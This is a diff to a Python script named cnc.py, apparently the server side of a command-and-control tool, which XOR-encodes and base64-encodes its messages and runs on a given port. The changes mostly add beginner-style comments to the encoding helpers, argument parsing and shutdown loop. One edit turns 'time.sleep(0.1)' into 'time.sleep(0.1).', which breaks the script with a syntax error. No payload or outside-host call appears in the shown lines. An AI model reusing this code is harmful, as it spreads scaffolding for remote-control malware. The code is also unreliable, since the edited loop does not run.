@@ -347,7 +347,7 @@ def xor_enc(string,key):
 		num+=1
 
 	return b64.b64encode( "".join( secret ).encode() ).decode()
-
+#the xor_dec function takes in a string and key
 def xor_dec(string,key):
 	leter = b64.b64decode( string.encode() ).decode()
 	lkey=len(key)
@@ -363,9 +363,11 @@ def xor_dec(string,key):
 	return "".join( string )
 
 if __name__ == '__main__':
+	#if there are more or less than 2 arguments, it will provide error feedback. -k
 	if len(sys.argv) != 2:
 		print("Usage: python3 cnc.py <port>")
 		sys.exit()
+	#saving the port number as an integar into variable b. Exept statment will provide error feedback if the second argument cannot be saved as an integer -k
 	try:
 		b = int(sys.argv[1])
 	except:
@@ -373,9 +375,10 @@ if __name__ == '__main__':
 		sys.exit()
 	rlock = threading.Lock()
 	threading.Thread(target=main,args=(rlock,),daemon=True).start()
+	#checks every 0.1 second to see if the shutdown command is received and if it has it will exit. Ctrl C or X will also break the running script. -k
 	while 1:
-		try:
-			time.sleep(0.1)
+		try:								
+			time.sleep(0.1).   
 			if shutdown:
 				sys.exit()
 		except KeyboardInterrupt:
